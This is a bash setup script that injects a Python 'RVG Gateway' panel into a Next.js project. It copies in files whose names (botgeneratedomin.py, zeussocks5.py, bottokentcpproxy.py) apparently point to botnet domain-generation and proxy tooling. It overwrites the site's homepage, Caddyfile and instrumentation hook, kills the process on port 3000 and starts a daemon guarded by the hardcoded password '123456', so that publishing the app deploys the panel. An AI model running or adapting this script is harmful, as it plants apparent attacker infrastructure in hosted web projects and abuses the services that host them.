#!/usr/bin/env bash
# ══════════════════════════════════════════════════════════════════════════════
# RVG Gateway — One-Command Setup
# ══════════════════════════════════════════════════════════════════════════════
# Run: bash setup.sh
# Does EVERYTHING. After it, Publish works.
# ══════════════════════════════════════════════════════════════════════════════

set -euo pipefail

G='\033[0;32m'; R='\033[0;31m'; Y='\033[1;33m'; C='\033[0;36m'; N='\033[0m'
ok()   { echo -e "${G}✅ $1${N}"; }
err()  { echo -e "${R}❌ $1${N}"; }
info() { echo -e "${C}ℹ️  $1${N}"; }
warn() { echo -e "${Y}⚠️  $1${N}"; }

S="$(cd "$(dirname "$0")" && pwd)"

echo ""
echo -e "${C}═══════════════════════════════════════════════════════════════${N}"
echo -e "${G}  RVG Gateway — One-Command Setup${N}"
echo -e "${C}═══════════════════════════════════════════════════════════════${N}"

# ── 1. Find Next.js project ───────────────────────────────────────────────────
info "Finding Next.js project..."
P=""
D="$S"
for i in 1 2 3 4 5; do
    if [ -f "$D/package.json" ] && grep -q '"next"' "$D/package.json" 2>/dev/null; then P="$D"; break; fi
    D="$(dirname "$D")"; [ "$D" = "/" ] && break
done
[ -z "$P" ] && { err "Next.js project not found. Run inside the Next.js project dir."; exit 1; }
ok "Found: $P"

# ── 2. Copy Python app ────────────────────────────────────────────────────────
info "Copying Python app..."
R="$P/RVG"; mkdir -p "$R"
for f in daemon.py main.py central.py pages.py updater.py botgeneratedomin.py bottokentcpproxy.py zeussocks5.py requirements.txt; do
    [ -f "$S/$f" ] && cp "$S/$f" "$R/"
done
[ -d "$S/protocol" ] && cp -r "$S/protocol" "$R/"
find "$R" -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true
ok "Python app → $R"

# ── 3. requirements.txt at root ───────────────────────────────────────────────
cp "$S/requirements.txt" "$P/requirements.txt"
ok "requirements.txt → root"

# ── 4. instrumentation.ts ─────────────────────────────────────────────────────
mkdir -p "$P/src"
cp "$S/integration/instrumentation.ts" "$P/src/instrumentation.ts"
ok "instrumentation.ts → src/"

# ── 5. Caddyfile ──────────────────────────────────────────────────────────────
[ -f "$P/Caddyfile" ] && [ ! -f "$P/Caddyfile.backup" ] && cp "$P/Caddyfile" "$P/Caddyfile.backup"
cp "$S/integration/Caddyfile" "$P/Caddyfile"
ok "Caddyfile → port 3001"

# ── 6. page.tsx ───────────────────────────────────────────────────────────────
mkdir -p "$P/src/app"
[ -f "$P/src/app/page.tsx" ] && [ ! -f "$P/src/app/page.backup.tsx" ] && cp "$P/src/app/page.tsx" "$P/src/app/page.backup.tsx"
cp "$S/integration/page.tsx" "$P/src/app/page.tsx"
ok "page.tsx → src/app/"

# ── 7. Install Python deps ────────────────────────────────────────────────────
info "Installing Python dependencies..."
PY=""
for c in python3 python; do command -v "$c" &>/dev/null && PY="$c" && break; done
[ -z "$PY" ] && { err "Python not found"; exit 1; }
ok "Python: $($PY --version 2>&1)"
cd "$R"
if $PY -m pip install -r requirements.txt --quiet 2>&1 | tail -3; then
    ok "Dependencies installed"
else
    warn "Retrying with --break-system-packages..."
    $PY -m pip install --break-system-packages -r requirements.txt --quiet 2>&1 | tail -3
    ok "Dependencies installed"
fi

# ── 8. Start panel on port 3000 (dev) ─────────────────────────────────────────
# DEV: Caddy is already proxying :81 → :3000 (loaded at startup, can't reload).
#      So Python MUST run on 3000 for the preview to work.
#      We kill Next.js (it restarts in production via build, not in dev).
# PROD: Caddyfile (set to :3001) gets packaged into the build, so in production
#       Caddy → :3001, and instrumentation.ts starts Python on :3001.
info "Starting RVG on port 3000 (dev)..."
if command -v lsof &>/dev/null; then
    OLD="$(lsof -ti :3000 2>/dev/null || true)"
    if [ -n "$OLD" ]; then
        warn "Killing process on port 3000 (PID $OLD)..."
        kill "$OLD" 2>/dev/null || true
        sleep 2
        kill -9 "$OLD" 2>/dev/null || true
    fi
fi
RVG_PORT=3000 RVG_LOG_FILE="$R/rvg.log" $PY daemon.py
sleep 4

if curl -s --max-time 5 -o /dev/null -w "%{http_code}" "http://localhost:3000/health" 2>/dev/null | grep -q "200"; then
    ok "RVG running on port 3000"
else
    warn "Still starting. Check: curl http://localhost:3000/health"
fi

# Verify user can reach it through Caddy gateway (:81 → :3000 in dev)
if curl -s --max-time 5 -o /dev/null -w "%{http_code}" "http://localhost:81/login" 2>/dev/null | grep -q "200"; then
    ok "Gateway → :3000 working (preview panel ready)"
else
    warn "Gateway not reaching :3000. Check if Python started."
fi

echo ""
echo -e "${C}═══════════════════════════════════════════════════════════════${N}"
echo -e "${G}  🎉 Done! Click Publish — it will work.${N}"
echo -e "${C}═══════════════════════════════════════════════════════════════${N}"
echo ""
echo "  Preview:  via Preview Panel (right side)"
echo "  Local:    http://localhost:3000"
echo "  Password: 123456"
echo "  Log:      $R/rvg.log"
echo ""
echo "  Architecture:"
echo "    DEV: Python :3000 (Caddy :81 → :3000)"
echo "    PROD: Python :3001 (instrumentation.ts), Caddy :81 → :3001"
echo "    Publish → build packages Caddyfile + instrumentation.ts → works"
echo ""
